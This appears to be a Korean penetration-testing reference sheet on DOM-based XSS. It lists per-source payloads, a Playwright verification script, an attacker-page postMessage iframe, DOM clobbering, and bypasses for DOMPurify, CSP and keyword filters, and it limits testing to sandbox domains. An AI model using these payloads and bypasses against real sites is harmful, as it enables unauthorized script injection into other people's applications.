**원칙**: DOM XSS는 서버 미경유 — **curl 금지**, Playwright로만 검증.

### 기본 페이로드

#### Source별

| Source | 페이로드 | 비고 |
|---|---|---|
| `location.hash` | `#<img src=x onerror=alert(document.domain)>` | URL 인코딩 불필요 (서버 미전송) |
| `location.hash` (href sink) | `#javascript:alert(1)` | `<a href>` 또는 `location.href` sink |
| `location.search` | `?q=<svg/onload=alert(1)>` | URL 인코딩 필요 |
| `window.name` | `<img src=x onerror=alert(document.domain)>` | `window.open`/`evaluate`로 설정 |
| `postMessage` | `{"type":"msg","data":"<img src=x onerror=alert(1)>"}` | origin 검증 누락 시 |
| `localStorage`/`sessionStorage` | `<img src=x onerror=alert(1)>` | 선행 주입 후 페이지 재방문 (2차) |
| `document.referrer` | 이전 페이지 URL에 `<img src=x onerror=alert(1)>` | referer 헤더 전달 |
| `document.cookie` | cookie 값에 페이로드 | 다른 XSS/sub-domain 경유 |
| `IndexedDB`/`localForage` | DB 저장값에 페이로드 | 선행 주입 후 |
| `BroadcastChannel` | 채널 메시지에 페이로드 | 같은 origin 다른 탭 |

#### Playwright 스크립트
```javascript
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: true });
  const ctx = await browser.newContext();
  await ctx.addCookies([{ name: 'SESSION', value: '<V>', domain: '<D>', path: '/' }]);
  const page = await ctx.newPage();

  let fired = false, msg = '';
  page.on('dialog', async d => { fired = true; msg = d.message(); await d.dismiss(); });

  // location.hash
  await page.goto('https://target/path#<img src=x onerror=alert(document.domain)>');

  // window.name (별도 frame에서 설정)
  // await page.evaluate(() => { window.name = '<img src=x onerror=alert(1)>'; });
  // await page.goto('https://target/path');

  // postMessage (origin 검증 우회)
  // await page.goto('https://target/path');
  // await page.evaluate(() => { window.postMessage('<img src=x onerror=alert(1)>', '*'); });

  await page.waitForTimeout(2000);
  const domLeak = await page.evaluate(() =>
    document.body.innerHTML.includes('<img src=x') ||
    document.body.innerHTML.includes('onerror')
  );
  console.log('fired:', fired, 'msg:', msg, 'domLeak:', domLeak);
  await browser.close();
})();
```

#### postMessage origin 우회 (외부 origin 시뮬레이션)
```html
<!-- attacker page -->
<iframe src="https://target/page" id=f></iframe>
<script>
  document.getElementById('f').onload = () => {
    f.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
  };
</script>
```

#### Trusted Types 미적용 확인
```javascript
const response = await page.goto('https://target/');
console.log('CSP:', response.headers()['content-security-policy']);
// require-trusted-types-for 'script'가 없으면 TT 미적용
```

#### DOM clobbering
```html
<!-- HTML form/img element가 ID/name으로 글로벌 변수 덮어쓰기 -->
<form name="config"><input id="api" value="https://attacker"></form>
<!-- JS가 window.config.api를 신뢰하면 우회 -->
```

---

### 우회 페이로드

phase1 `## 우회 가능 패턴` (xss-scanner와 공유).

| 방어 | 우회 |
|---|---|
| DOMPurify 호출 | 구버전 mXSS 변형 (`<form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=alert(1)>`) |
| `encodeURI`/`encodeURIComponent` | fragment는 encode 안 해도 location.hash로 들어감 |
| origin 검증 (postMessage) | `'*'` 또는 origin substring match 우회 |
| CSP `script-src` | `data:`, `unsafe-eval`, dangling scripts, JSONP endpoint, JS gadget |
| 키워드 블랙리스트 | `<sCrIpT>`, `<scr<script>ipt>`, 이벤트 핸들러 변형 (`onpointerover`, `onfocus autofocus`, `onanimationstart`) |
| Trusted Types 적용 | string sink 거부되나 `unsafe` policy 등록되면 우회 — policy 정의 점검 |

#### hash 페이로드 변형
```
#<svg/onload=alert(1)>                         (28자, script 차단 환경)
#<img src=x onerror=alert(1)>                  (30자)
#<details/open/ontoggle=alert(1)>              (33자)
#javascript:alert(1)                           (href sink)
#<style>@import 'data:,*{background:url(...)}' </style>  (CSS injection)
```

---

### 참고사항

- DOM XSS는 서버 무경유 — curl 결과로 판정 절대 금지
- hash sink가 가장 빈번 — `location.hash`, `window.location.hash`
- `eval`, `Function()`, `setTimeout(문자열)`, `setInterval(문자열)` sink는 직접 JS 실행
- `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, jQuery `.html()` sink는 HTML 파싱
- `location.href = userInput`에서 `javascript:` 스킴 허용 시 XSS — href sink별도
- localStorage Source는 2차 공격 경로 — 독립적 공격 아님 (다른 XSS 선행 필요)
- postMessage `targetOrigin: '*'`는 누구나 수신 — origin 체크 필수
- Shadow DOM / iframe 내부 sink는 parent context와 분리 — 별도 점검
- Trusted Types 정책 (`require-trusted-types-for 'script'`) 있으면 string sink 거부
- DOM clobbering은 별도 — `<img name="attributes">` 같은 ID/name 충돌 공격
- sandbox 도메인 한정 테스트 — prod 금지
- Playwright 실행 시도 없이 `[도구 한계]`로 표시 금지 — 실제 실행 후 실패한 경우만
- `page.waitForTimeout(2000)` 대신 `page.waitForSelector`/`page.waitForFunction`으로 충분히 대기
- alert/confirm/prompt 모두 `dialog` 이벤트로 캐치 가능
- DOM 삽입만 확인되고 실행 안 되어도 후보 — sink 도달 자체가 위험
- Service Worker / SharedWorker postMessage source는 별도 frame에서 검증 필요
